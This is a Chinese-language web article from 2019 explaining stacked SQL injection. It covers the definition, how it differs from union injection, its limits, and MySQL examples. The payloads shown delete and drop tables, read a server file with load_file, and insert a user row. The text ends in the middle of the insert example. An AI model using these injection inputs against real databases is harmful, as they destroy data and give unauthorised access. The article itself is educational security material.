<html>
<head>
<title>堆叠注入详解</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
堆叠注入详解
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    backlion
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2019-07-08</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><h2><span style="font-size:18px;line-height:38px;;"><strong>0x00 堆叠注入定义</strong></span></a></h2><p><span style="font-size:18px;line-height:38px;;"><strong><br  /></strong></span></p><p>&nbsp; &nbsp; &nbsp;<span style="font-size:14px;line-height:34px;;">Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。</span><span style="font-size:14px;line-height:34px;;">而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。</span><span style="font-size:14px;line-height:34px;;">这样我们就想到了是不是可以多句一起使用。</span><span style="font-size:14px;line-height:34px;;">这个叫做stacked &nbsp;injection。</span></p><p><br  /></p><h2><strong><span style="font-size:18px;line-height:38px;;">0x01 堆叠注入原理</span></strong></h2><p><strong><span style="font-size:18px;line-height:38px;;"><br  /></span></strong></p><p>&nbsp;&nbsp;&nbsp;<span style="font-size:14px;line-height:34px;;">&nbsp;&nbsp;在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在&nbsp;;&nbsp;结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</span></p><p><span style="font-size:18px;line-height:38px;;"><strong><br  /></strong></span></p><h2><span style="font-size:18px;line-height:38px;;"><strong>0x02 堆叠注入的局限性</strong></span></h2><p><br  /></p><p><span style="font-size:14px;line-height:34px;;">堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</span></p><p><img class="" data-ratio="0.13753581661891118" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/1_h4DVm9Gf7HjAdcwibUDlUpgOvqqaHQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGhPS55xNX1FDgrZ85ZhsBW74tNh4DVm9Gf7HjAdcwibUDlUpgOvqqaHQ/640?wx_fmt=gif'" data-type="gif" data-w="698" height="96" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="698"  /></p><p><span style="font-size:14px;line-height:34px;;">此图是从原文中截取过来的，因为我个人的测试环境是php+mysql，是可以执行的，此处对于mysql/php存在质疑。</span><span style="font-size:14px;line-height:34px;;">但个人估计原文作者可能与我的版本的不同的原因。</span><span style="font-size:14px;line-height:34px;;">虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。</span><span style="font-size:14px;line-height:34px;;">在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。</span><span style="font-size:14px;line-height:34px;;">因此，在读取数据时，我们建议使用union（联合）注入。</span><span style="font-size:14px;line-height:34px;;">同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</span></p><p><span style="font-size:14px;line-height:34px;;"><br  /></span></p><h2><span style="font-size:18px;line-height:38px;;"><strong>0x03 各个数据库实例介绍</strong></span><span style="font-size:14px;line-height:34px;;"></span></h2><p><span style="font-size:18px;line-height:38px;;"><strong><br  /></strong></span></p><p><span style="font-size:14px;line-height:34px;;">本节我们从常用数据库角度出发，介绍几个类型的数据库的相关用法。</span><span style="font-size:14px;line-height:34px;;">数据库的基本操作，增删查改。</span><span style="font-size:14px;line-height:34px;;">以下列出数据库相关堆叠注入的基本操作。</span></p><p><span style="font-size:14px;line-height:34px;;"><br  /></span></p><h2><span style="font-size:14px;line-height:34px;;">1.Mysql</span></h2><p><span style="font-size:14px;line-height:34px;;">（1）新建一表&nbsp;</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">where</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">create</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">test</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">like</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>;</code></pre></section><p><img class="" data-ratio="0.22274143302180685" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/2_mLicGxLaTonkqZFJ1hDrUJuecEiaeg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGzopEfST9fKOYnBFtztaOlibP7KicmLicGxLaTonkqZFJ1hDrUJuecEiaeg/640?wx_fmt=gif'" data-type="gif" data-w="642" height="143" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="642"  /></p><p><span style="font-size:14px;line-height:34px;;">执行成功，我们再去看一下是否新建成功表。</span></p><p><img class="" data-ratio="0.5053763440860215" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/3_o3ejqWia2F37AfmS4u76fFuYCXwOtw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XG6C90NZRgT9fsFdAoOJzZurl6yo3ejqWia2F37AfmS4u76fFuYCXwOtw/640?wx_fmt=gif'" data-type="gif" data-w="651" height="329" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="651"  /></p><p><span style="font-size:14px;line-height:34px;;">（2）删除上面新建的test表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">where</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">test</span>;</code></pre></section><p><img class="" data-ratio="0.22848200312989045" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/4_99p3Q7Lpk95miaaZssaRCwiakZYaQw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGW9uBK2NRvshuiabztnIfrRkFib1D99p3Q7Lpk95miaaZssaRCwiakZYaQw/640?wx_fmt=gif'" data-type="gif" data-w="639" height="146" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="639"  /></p><p><img class="" data-ratio="0.4501557632398754" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/5_dFib6nicLZ0ED6sCe5dTjaaaLRQ2og.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGwC6Y3yd9wepibHNaYIcf1x6lAoxdFib6nicLZ0ED6sCe5dTjaaaLRQ2og/640?wx_fmt=gif'" data-type="gif" data-w="642" height="289" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="642"  /></p><p><span style="font-size:14px;line-height:34px;;">（3）查询数据</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">where</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>,<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">2</span>,<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">3</span>;</code></pre></section><p><img class="" data-ratio="0.3395931142410016" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/6_bmMYqmTJVMCgrVO2v9r7FzbkFFR2Gw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGC9qTKhKMmEdyicdraNqTDXJtiabmMYqmTJVMCgrVO2v9r7FzbkFFR2Gw/640?wx_fmt=gif'" data-type="gif" data-w="639" height="217" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="639"  /></p><p><span style="font-size:14px;line-height:34px;;">（4）加载文件&nbsp;&nbsp;</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">where</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">load_file</span>(<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 111px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'c:/tmpupbbn.php'</span>);</code></pre></section><p><img class="" data-ratio="0.46153846153846156" src="图片/HACK学习呀_2019-07-08_堆叠注入详解/7_TF78kW4VK41sVz7yz6uBjXUWEv8F9A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DPOrYmicU2PBZeZKVqa6XGEVaFocQKT7170zbyNl3OjoX2TF78kW4VK41sVz7yz6uBjXUWEv8F9A/640?wx_fmt=gif'" data-type="gif" data-w="637" height="294" style="border-width: 0px;border-style: initial;border-color: initial;max-width: 900px;" width="637"  /></p><p><span style="font-size:14px;line-height:34px;;">(4) 修改数据</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">where</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">insert</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">into</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>(<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>,username,<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">password</span>) <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">values</span> (<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'100'</span>,<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 